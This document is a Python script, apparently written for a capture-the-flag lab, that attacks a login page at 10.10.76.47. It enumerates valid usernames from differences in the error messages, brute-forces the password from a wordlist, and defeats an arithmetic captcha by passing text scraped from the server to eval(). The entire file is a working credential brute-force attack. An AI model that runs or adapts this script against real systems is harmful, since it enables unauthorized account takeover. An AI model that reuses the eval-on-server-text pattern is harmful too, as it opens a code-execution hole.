import requests

url = "http://10.10.76.47/login"

with open("./usernames.txt", "r") as f:
    usernames = f.readlines()

with open("./passwords.txt", "r") as f:
    passwords = f.readlines()


data = {
    "username": "username",
    "password": "password",
}
response = requests.post(url, data=data)

index = 0
for username in usernames:
    data = {
        "username": username.strip(),
        "password": "yeet",
    }

    if "?" in response.text:
        lines = response.text.split("\n")
        for line in lines:
            if "?" in line:
                data["captcha"] = eval(line.split("=")[0])
                break

    response = requests.post(url, data=data)

    if "The user" not in response.text:
        print(f"Username is {username.strip()}")
        break

    print(f"Username: {index}/{len(usernames)}")
    index += 1

index = 0
for password in passwords:
    data = {
        "username": username.strip(),
        "password": password.strip(),
    }

    if "?" in response.text:
        lines = response.text.split("\n")
        for line in lines:
            if "?" in line:
                data["captcha"] = eval(line.split("=")[0])
                break

    response = requests.post(url, data=data)

    if "Invalid password" not in response.text:
        print(f"Password is {password.strip()}")
        break

    print(f"Password: {index}/{len(passwords)}")
    index += 1

print(f"{username.strip()}:{password.strip()}")
